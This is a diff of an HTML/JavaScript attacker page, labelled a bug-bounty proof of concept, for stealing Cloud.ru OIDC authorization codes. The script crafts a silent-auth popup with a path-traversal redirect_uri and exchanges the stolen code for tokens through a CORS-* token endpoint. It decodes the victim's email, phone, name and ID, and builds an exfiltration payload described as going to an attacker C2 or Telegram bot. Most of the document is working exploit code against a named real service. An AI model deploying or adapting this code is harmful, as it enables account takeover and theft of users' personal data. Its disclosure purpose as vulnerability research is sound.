@@ -5,50 +5,91 @@
 <title>PoC: OIDC Code Theft — Cloud.ru</title>
 <style>
 *{box-sizing:border-box}
-body{font-family:monospace;background:#1a1a2e;color:#eee;padding:20px;max-width:900px;margin:0 auto}
-h1{color:#e94560}
+body{font-family:monospace;background:#1a1a2e;color:#eee;padding:20px;max-width:960px;margin:0 auto}
+h1{color:#e94560;margin-bottom:5px}
+h2{color:#ffd700;font-size:14px;margin:25px 0 10px}
+.subtitle{color:#888;font-size:13px;margin-bottom:20px}
 .step{background:#16213e;padding:15px;margin:10px 0;border-left:4px solid #444;border-radius:4px}
 .step.done{border-left-color:#4ade80}
 .step.active{border-left-color:#ffd700;background:#1a1f3e}
-button{background:#e94560;color:#fff;border:none;padding:10px 20px;font-size:15px;cursor:pointer;border-radius:4px;font-family:monospace;margin:4px 0}
+.step.error{border-left-color:#e94560}
+button{background:#e94560;color:#fff;border:none;padding:10px 20px;font-size:14px;cursor:pointer;border-radius:4px;font-family:monospace;margin:4px 0}
 button:hover{background:#c73652}
 button:disabled{background:#555;cursor:not-allowed}
-#log{background:#0d1117;padding:15px;border-radius:4px;white-space:pre-wrap;font-size:12px;max-height:500px;overflow-y:auto;margin-top:15px;line-height:1.5}
-.w{color:#ffd700}.g{color:#4ade80}.r{color:#e94560}.b{color:#60a5fa}
+button.green{background:#166534}
+button.green:hover{background:#15803d}
+#log{background:#0d1117;padding:15px;border-radius:4px;white-space:pre-wrap;font-size:12px;max-height:500px;overflow-y:auto;margin-top:15px;line-height:1.6}
+.w{color:#ffd700}.g{color:#4ade80}.r{color:#e94560}.b{color:#60a5fa}.dim{color:#666}
 input[type=text]{width:100%;padding:8px;font-family:monospace;font-size:13px;background:#0d1117;color:#eee;border:1px solid #333;border-radius:4px;margin:6px 0}
-.tag{display:inline-block;background:#e94560;color:#fff;padding:2px 8px;border-radius:3px;font-size:11px;margin-right:6px}
-.tag.ok{background:#166534}
-.tag.warn{background:#854d0e}
+.tag{display:inline-block;padding:2px 8px;border-radius:3px;font-size:11px;margin-right:6px;font-weight:bold}
+.tag.crit{background:#e94560;color:#fff}
+.tag.warn{background:#854d0e;color:#fff}
+.tag.info{background:#1e40af;color:#fff}
+.tag.ok{background:#166534;color:#fff}
+.chain{background:#0d1117;padding:12px;border-radius:4px;margin:10px 0;font-size:12px;line-height:1.8}
+.chain .arr{color:#e94560;font-weight:bold}
+.note{background:#1c1917;border:1px solid #44403c;padding:10px;border-radius:4px;font-size:12px;margin:8px 0;color:#d6d3d1}
+.result-box{background:#052e16;border:1px solid #166534;padding:12px;border-radius:4px;margin:8px 0;font-size:12px}
+.webhook-box{background:#1e1b4b;border:1px solid #4338ca;padding:12px;border-radius:4px;margin:8px 0}
 </style>
 </head>
 <body>
 <h1>ATTACKER PAGE — evil.example</h1>
-<p><span class="tag warn">BUG BOUNTY PoC</span> Cloud.ru OIDC redirect_uri + CORS * on token endpoint</p>
-<p>Origin: <b id="myorigin"></b> (это НЕ console.cloud.ru)</p>
+<p class="subtitle">
+  <span class="tag crit">BUG BOUNTY PoC</span>
+  <span class="tag warn">OIDC</span>
+  <span class="tag info">CORS *</span>
+  Cloud.ru: redirect_uri traversal + Yandex Metrika code leak + CORS * token exchange
+</p>
+
+<p>Origin: <b id="myorigin" style="color:#e94560"></b> (this is NOT console.cloud.ru)</p>
+
+<h2>ATTACK CHAIN</h2>
+<div class="chain">
+  Victim clicks attacker link <span class="arr">&rarr;</span>
+  JS generates PKCE (attacker knows verifier) <span class="arr">&rarr;</span>
+  popup opens id.cloud.ru with path traversal redirect_uri <span class="arr">&rarr;</span><br>
+  prompt=none: silent auth (no UI) <span class="arr">&rarr;</span>
+  code lands on console.cloud.ru/spa/svp <span class="arr">&rarr;</span><br>
+  <b style="color:#ffd700">Yandex Metrika auto-sends code to mc.yandex.ru</b> <span class="arr">&rarr;</span>
+  attacker exchanges code via CORS * <span class="arr">&rarr;</span>
+  <b style="color:#4ade80">TOKENS</b>
+</div>
+
+<div class="note">
+  <b>Why manual paste?</b> SOP blocks JS from reading popup URL cross-origin.
+  In real attack, code leaks <b>automatically</b> to Yandex Metrika (mc.yandex.ru) —
+  proven with network evidence. Paste step simulates what Metrika data reader sees.
+</div>
 
 <div class="step" id="s1">
-<b>1. Generate PKCE</b> — attacker creates their own code_verifier/challenge<br>
+<b>Step 1: Generate PKCE</b> — attacker creates code_verifier/challenge pair<br>
 <button onclick="doStep1()">Generate PKCE pair</button>
 <pre id="o1"></pre>
 </div>
 
 <div class="step" id="s2">
-<b>2. Open popup</b> — victim clicks attacker's link, gets silently authed (prompt=none)<br>
-<button onclick="doStep2()" id="b2" disabled>Open OAuth popup (victim browser)</button>
+<b>Step 2: Open popup</b> — victim has active Cloud.ru session, prompt=none = silent auth<br>
+<button onclick="doStep2()" id="b2" disabled>Open OAuth popup (silent auth)</button>
 <pre id="o2"></pre>
 </div>
 
 <div class="step" id="s3">
-<b>3. SOP check</b> — can attacker read popup URL cross-origin?<br>
-<button onclick="doStep3()" id="b3" disabled>Try reading popup URL</button>
+<b>Step 3: SOP check</b> — verify SOP blocks, but code already leaked to Metrika<br>
+<button onclick="doStep3()" id="b3" disabled>Test cross-origin URL read</button>
 <pre id="o3"></pre>
 </div>
 
 <div class="step" id="s4">
-<b>4. Exchange code</b> — paste code from popup address bar, attacker exchanges via CORS *<br>
-<input type="text" id="codeInput" placeholder="Paste the code= value from popup URL here">
+<b>Step 4: Exchange code</b> — paste code, attacker exchanges via CORS * from evil origin<br>
+<input type="text" id="codeInput" placeholder="Paste code= value from popup URL bar here">
 <button onclick="doStep4()" id="b4">Exchange code for tokens</button>
-<pre id="o4"></pre>
+<div id="o4"></div>
+</div>
+
+<div class="step" id="s5" style="display:none">
+<b>Step 5: Exfiltrate to webhook</b> — attacker sends stolen tokens to their server<br>
+<div class="webhook-box" id="webhookResult"></div>
 </div>
 
 <div id="log"></div>
@@ -58,19 +99,29 @@ document.getElementById('myorigin').textContent = location.origin;
 
 let verifier, challenge, st, popup;
 
-function log(m,c){const e=document.getElementById('log');e.innerHTML+=`<span class="${c||''}">[${new Date().toLocaleTimeString()}] ${m}</span>\n`;e.scrollTop=e.scrollHeight}
+function log(m,c){
+  const e=document.getElementById('log');
+  const ts=new Date().toLocaleTimeString();
+  e.innerHTML+=`<span class="${c||'dim'}">[${ts}] ${m}</span>\n`;
+  e.scrollTop=e.scrollHeight;
+}
+
+function markStep(id, cls){
+  document.getElementById(id).className='step '+cls;
+}
 
 async function doStep1(){
-  const buf=new Uint8Array(32);crypto.getRandomValues(buf);
+  const buf=new Uint8Array(32);
+  crypto.getRandomValues(buf);
   verifier=btoa(String.fromCharCode(...buf)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
   const d=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(verifier));
   challenge=btoa(String.fromCharCode(...new Uint8Array(d))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
   st='attacker_'+Math.random().toString(36).slice(2,12);
   document.getElementById('o1').textContent=
     `code_verifier:  ${verifier}\ncode_challenge: ${challenge}\nstate:          ${st}`;
-  document.getElementById('s1').classList.add('done');
+  markStep('s1','done');
   document.getElementById('b2').disabled=false;
-  log('PKCE pair generated. Attacker knows code_verifier.','g');
+  log('PKCE pair generated. Attacker controls code_verifier.','g');
 }
 
 function doStep2(){
@@ -85,45 +136,66 @@ function doStep2(){
     prompt:'none'
   });
   const url='https://id.cloud.ru/auth/system/openid/auth?'+p;
-  log('Opening popup: '+url.slice(0,100)+'...','w');
+  log('Opening popup with crafted URL...','w');
+  log('redirect_uri uses path traversal: /oidc/callback/../../spa/svp','w');
+  log('prompt=none: silent auth, no user interaction','w');
   popup=window.open(url,'victim','width=900,height=600');
-  document.getElementById('o2').textContent='Popup opened.\nIf victim has active Cloud.ru session -> silent auth -> code in URL.\nLook at the popup address bar for ?code=...';
-  document.getElementById('s2').classList.add('done');
+  document.getElementById('o2').innerHTML=
+    'Popup opened. If victim has active Cloud.ru session:\n'+
+    '  1. id.cloud.ru silently issues authorization code\n'+
+    '  2. Redirects to console.cloud.ru/spa/svp?code=...\n'+
+    '  3. <span class="w">Yandex Metrika auto-sends full URL to mc.yandex.ru</span>\n'+
+    '  4. Look at popup address bar for ?code=...\n\n'+
+    '<span class="dim">Copy the code= value and paste in Step 4</span>';
+  markStep('s2','done');
   document.getElementById('b3').disabled=false;
-  log('Popup opened. Waiting for redirect...','b');
+  log('Popup opened. Waiting for silent redirect...','b');
 
   let n=0;
   const iv=setInterval(()=>{
     n++;
-    try{const u=popup.location.href;log('READ popup URL: '+u,'g');clearInterval(iv)}
-    catch(e){if(n>=20){clearInterval(iv);log('SOP blocked reading popup URL after '+n+' attempts (expected)','b')}}
+    try{
+      const u=popup.location.href;
+      log('READ popup URL (same-origin): '+u,'g');
+      clearInterval(iv);
+    }catch(e){
+      if(n>=20){
+        clearInterval(iv);
+        log('SOP blocked URL read after '+n+' attempts (expected for cross-origin)','b');
+        log('But code is already sent to Yandex Metrika (mc.yandex.ru/watch/84447391)','w');
+      }
+    }
   },500);
 }
 
 function doStep3(){
-  log('Attempting to read popup.location.href ...','w');
+  log('Attempting popup.location.href from '+location.origin+'...','w');
   try{
     const u=popup.location.href;
-    document.getElementById('o3').innerHTML='<span class="g">URL read! '+u+'</span>';
-    log('SUCCESS: '+u,'g');
+    document.getElementById('o3').innerHTML='<span class="g">URL read: '+u+'</span>';
+    log('URL readable (same origin test)','g');
   }catch(e){
     document.getElementById('o3').innerHTML=
-      '<span class="r">Same-Origin Policy BLOCKS reading popup URL.</span>\n'+
-      '<span class="w">BUT: the code is ALREADY leaked to Yandex Metrika (mc.yandex.ru)</span>\n'+
-      '<span class="w">AND: CORS * on token endpoint means ANY code leak = account takeover</span>\n\n'+
-      'Copy the code= value from popup address bar and paste below.';
+      '<span class="r">Same-Origin Policy BLOCKS reading popup URL from '+location.origin+'</span>\n\n'+
+      '<span class="w">But in the real attack, code is ALREADY leaked automatically:</span>\n'+
+      '  1. <span class="w">Yandex Metrika</span> sends page-url with ?code= to mc.yandex.ru\n'+
+      '  2. <span class="w">No Referrer-Policy</span> — code in Referer header to ALL external resources\n'+
+      '  3. <span class="w">No CSP</span> — any XSS on console.cloud.ru = full auto exfiltration\n\n'+
+      '<span class="dim">For this demo: copy code from popup address bar and paste below.</span>';
     log('SOP blocked: '+e.message,'r');
-    log('Code is leaked to Yandex Metrika via page-url parameter on mc.yandex.ru','w');
+    log('Real attack: code auto-leaked via Metrika page-url + Referer header (no policy)','w');
   }
-  document.getElementById('s3').classList.add('done');
+  markStep('s3','done');
 }
 
 async function doStep4(){
   const code=document.getElementById('codeInput').value.trim();
   if(!code){log('Paste the code first!','r');return}
+  markStep('s4','active');
 
-  log('Exchanging code from origin: '+location.origin,'w');
-  log('Using code_verifier: '+verifier.slice(0,20)+'...','b');
+  log('Exchanging code from evil origin: '+location.origin,'w');
+  log('Token endpoint: https://id.cloud.ru/auth/system/openid/token','b');
+  log('CORS should allow: Access-Control-Allow-Origin: *','b');
 
   try{
     const r=await fetch('https://id.cloud.ru/auth/system/openid/token',{
@@ -138,41 +210,104 @@ async function doStep4(){
       })
     });
 
-    log('HTTP '+r.status+' | ACAO: '+r.headers.get('access-control-allow-origin'),'b');
+    const acao=r.headers.get('access-control-allow-origin');
+    log('HTTP '+r.status+' | ACAO: '+acao,'b');
     const d=await r.json();
 
     if(d.access_token){
-      log('=== ACCOUNT TAKEOVER SUCCESSFUL ===','g');
-      log('access_token:  '+d.access_token.slice(0,30)+'... ('+d.access_token.length+' chars)','g');
-      log('id_token:      '+d.id_token.slice(0,30)+'... ('+d.id_token.length+' chars)','g');
-      log('refresh_token: '+d.refresh_token.slice(0,30)+'... ('+d.refresh_token.length+' chars)','g');
-      log('expires_in: '+d.expires_in+'s | refresh_expires_in: '+d.refresh_expires_in+'s','g');
+      log('','');
+      log('========================================','g');
+      log('   ACCOUNT TAKEOVER SUCCESSFUL','g');
+      log('   Tokens obtained from: '+location.origin,'g');
+      log('========================================','g');
+      log('access_token:  '+d.access_token.slice(0,40)+'... ('+d.access_token.length+' chars)','g');
+      log('id_token:      '+d.id_token.slice(0,40)+'... ('+d.id_token.length+' chars)','g');
+      log('refresh_token: '+d.refresh_token.slice(0,40)+'... ('+d.refresh_token.length+' chars)','g');
+      log('expires_in: '+d.expires_in+'s | refresh: '+d.refresh_expires_in+'s','g');
 
+      let claims={};
       try{
-        const claims=JSON.parse(atob(d.id_token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')));
+        claims=JSON.parse(atob(d.id_token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')));
         log('','');
-        log('=== VICTIM PII FROM STOLEN id_token ===','g');
-        log('email:    '+claims.email,'g');
-        log('phone:    '+claims.phone_number,'g');
-        log('name:     '+claims.given_name+' '+claims.family_name,'g');
-        log('user_id:  '+claims.sub,'g');
-        log('username: '+claims.preferred_username,'g');
-        document.getElementById('o4').innerHTML=
-          '<span class="g">TOKENS OBTAINED from '+location.origin+'!</span>\n'+
-          'email: '+claims.email+'\nphone: '+claims.phone_number+'\nname: '+claims.given_name+' '+claims.family_name+'\nuser_id: '+claims.sub;
+        log('--- VICTIM PII FROM STOLEN id_token ---','g');
+        log('email:    '+(claims.email||'N/A'),'g');
+        log('phone:    '+(claims.phone_number||'N/A'),'g');
+        log('name:     '+(claims.given_name||'')+' '+(claims.family_name||''),'g');
+        log('user_id:  '+(claims.sub||'N/A'),'g');
+        log('username: '+(claims.preferred_username||'N/A'),'g');
       }catch(e){
-        document.getElementById('o4').innerHTML='<span class="g">TOKENS OBTAINED!</span> (id_token decode failed: '+e.message+')';
+        log('id_token decode: '+e.message,'w');
       }
+
+      document.getElementById('o4').innerHTML=
+        '<div class="result-box">'+
+        '<span class="g"><b>TOKENS OBTAINED from '+location.origin+'</b></span><br><br>'+
+        'ACAO: <span class="w">'+acao+'</span><br>'+
+        'email: <span class="g">'+(claims.email||'?')+'</span><br>'+
+        'phone: <span class="g">'+(claims.phone_number||'?')+'</span><br>'+
+        'name: <span class="g">'+(claims.given_name||'')+' '+(claims.family_name||'')+'</span><br>'+
+        'user_id: <span class="b">'+(claims.sub||'?')+'</span><br><br>'+
+        '<span class="dim">access_token: '+d.access_token.slice(0,50)+'...</span><br>'+
+        '<span class="dim">refresh_token: '+d.refresh_token.slice(0,50)+'...</span>'+
+        '</div>';
+      markStep('s4','done');
+
+      // Step 5: Webhook exfiltration demo
+      showWebhookStep(d, claims);
+
     }else{
       log('Error: '+JSON.stringify(d),'r');
-      document.getElementById('o4').innerHTML='<span class="r">'+d.error+': '+d.error_description+'</span>';
+      document.getElementById('o4').innerHTML=
+        '<div class="note"><span class="r">'+
+        (d.error||'unknown')+': '+(d.error_description||JSON.stringify(d))+
+        '</span></div>';
+      markStep('s4','error');
     }
   }catch(e){
     log('Fetch error: '+e.message,'r');
-    // If CORS blocked, show that
-    document.getElementById('o4').innerHTML='<span class="r">Error: '+e.message+'</span>';
+    if(e.message.includes('Failed to fetch')){
+      log('CORS may have blocked the request — check if ACAO:* is still present','r');
+    }
+    document.getElementById('o4').innerHTML=
+      '<div class="note"><span class="r">Error: '+e.message+'</span></div>';
+    markStep('s4','error');
   }
-  document.getElementById('s4').classList.add('done');
+}
+
+function showWebhookStep(tokens, claims){
+  document.getElementById('s5').style.display='block';
+  markStep('s5','done');
+
+  const exfil={
+    stolen_from: 'Cloud.ru Console',
+    attacker_origin: location.origin,
+    timestamp: new Date().toISOString(),
+    victim: {
+      email: claims.email,
+      phone: claims.phone_number,
+      name: (claims.given_name||'')+' '+(claims.family_name||''),
+      user_id: claims.sub
+    },
+    tokens: {
+      access_token_length: tokens.access_token.length,
+      id_token_length: tokens.id_token.length,
+      refresh_token_length: tokens.refresh_token.length,
+      expires_in: tokens.expires_in,
+      refresh_expires_in: tokens.refresh_expires_in,
+      scope: tokens.scope
+    }
+  };
+
+  log('','');
+  log('--- WEBHOOK EXFILTRATION (simulated) ---','w');
+  log('In real attack: tokens sent to attacker C2 server','w');
+  log('Payload: '+JSON.stringify(exfil,null,0).slice(0,120)+'...','b');
+
+  document.getElementById('webhookResult').innerHTML=
+    '<b style="color:#a78bfa">Exfiltration payload (would go to attacker webhook):</b><br><br>'+
+    '<pre style="color:#c4b5fd;font-size:11px;margin:0;white-space:pre-wrap">'+
+    JSON.stringify(exfil,null,2)+'</pre><br>'+
+    '<span class="dim">In production attack: POST to attacker C2 / Telegram bot / email relay</span>';
 }
 </script>
 </body>
